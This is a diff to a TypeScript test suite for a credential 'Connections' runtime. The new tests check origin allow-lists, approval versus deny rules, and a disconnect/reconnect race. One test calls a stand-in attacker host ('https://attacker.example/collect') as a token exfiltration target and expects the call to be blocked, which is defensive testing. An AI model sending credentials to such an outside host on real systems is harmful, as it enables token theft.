@@ -181,6 +181,29 @@ describe("Connections runtime dry run and audit", () => {
     ])
   })
 
+  it("never sends the credential to an origin outside the provider origins", async () => {
+    const api = okApi()
+    const { name, runtime, store } = setupRuntime({ definition: { access: { server: { allow: ["*"] } }, provider: fakeProvider().provider }, fetch: api.fetch })
+    await store.write({ name, provider: "fake", tokens: tokenSet() })
+
+    await expectCode(runtime.fetch(name, "https://attacker.example/collect", undefined, { actor: server }), "CONNECTIONS_ORIGIN_NOT_ALLOWED")
+    await expectCode(runtime.fetch(name, "http://api.example/items", undefined, { actor: server }), "CONNECTIONS_ORIGIN_NOT_ALLOWED")
+    await expectCode(runtime.call(name, { ...readOperation, request: () => ({ method: "GET", url: "https://api.example.attacker.example/x" }) }, { id: "1" }, { actor: server }), "CONNECTIONS_ORIGIN_NOT_ALLOWED")
+    expect(api.calls).toEqual([])
+    expect((await runtime.activity({}))[0]).toMatchObject({ error: "CONNECTIONS_ORIGIN_NOT_ALLOWED", outcome: "denied", target: "api.example.attacker.example/x" })
+  })
+
+  it("runs an approved Operation that an approve rule would stop", async () => {
+    const api = okApi()
+    const { name, runtime, store } = setupRuntime({ definition: { access: { agents: { triage: { approve: ["test.items.create"], deny: ["test.items.get"] } } }, provider: fakeProvider().provider }, fetch: api.fetch })
+    await store.write({ name, provider: "fake", tokens: tokenSet() })
+
+    await expectCode(runtime.call(name, writeOperation, { name: "x" }, { actor: agent }), "CONNECTIONS_APPROVAL_REQUIRED")
+    await expect(runtime.call(name, writeOperation, { name: "x" }, { actor: agent, approved: true })).resolves.toEqual({ created: "created-item" })
+    // Approval never overrides a deny rule.
+    await expectCode(runtime.call(name, readOperation, { id: "1" }, { actor: agent, approved: true }), "CONNECTIONS_DENIED")
+  })
+
   it("never stores tokens or bodies in activity", async () => {
     const api = mockFetch((url, init, index) => index === 1
       ? new Response(null, { status: 401 })
@@ -295,7 +318,7 @@ describe("Connections runtime refresh", () => {
       return Response.json({ id: "1", ok: true })
     })
     const definition: ConnectionDefinition = {
-      provider: oauth2({ authorizationUrl: "https://auth.example/authorize", client: () => ({ clientId: "client" }), scopes: ["test.read"], tokenUrl: "https://auth.example/token" }),
+      provider: oauth2({ authorizationUrl: "https://auth.example/authorize", client: () => ({ clientId: "client" }), origins: ["https://api.example"], scopes: ["test.read"], tokenUrl: "https://auth.example/token" }),
     }
     const { name, runtime, store } = setupRuntime({ definition, fetch: provider.fetch })
     await store.write({ name, provider: "oauth2", tokens: tokenSet({ expiresAt: Date.now() - 1 }) })
@@ -396,7 +419,7 @@ describe("Connections runtime lifecycle", () => {
   it("summarizes Connections without tokens", async () => {
     const { name, runtime, store } = setupRuntime({ definition: { description: "Inbox", provider: fakeProvider().provider } })
     expect(runtime.names()).toEqual([name])
-    expect(await runtime.list()).toEqual([{ access: {}, description: "Inbox", name, provider: "fake", scopes: ["test.read"], status: "disconnected" }])
+    expect(await runtime.list()).toEqual([{ access: {}, description: "Inbox", name, origins: ["https://api.example"], provider: "fake", scopes: ["test.read"], status: "disconnected" }])
 
     await store.write({ name, provider: "fake", tokens: tokenSet() })
     const summary = await runtime.inspect(name)
@@ -429,6 +452,17 @@ describe("Connections runtime lifecycle", () => {
     await runtime.disconnect(name, { actor: server })
     expect(fake.revoke).not.toHaveBeenCalled()
     expect(await store.grant(name)).toBeUndefined()
+  })
+
+  it("keeps a grant that a reconnect wrote while disconnect revoked the old one", async () => {
+    const { fake, name, runtime, store } = setupRuntime()
+    await store.write({ name, provider: "fake", tokens: tokenSet() })
+    fake.revoke.mockImplementationOnce(async () => {
+      await store.write({ name, provider: "fake", tokens: tokenSet({ accessToken: "reconnected" }) })
+    })
+
+    await runtime.disconnect(name, { actor: server })
+    expect((await store.tokens(name))?.tokens.accessToken).toBe("reconnected")
   })
 
   it("revokes and deletes the grant on disconnect", async () => {
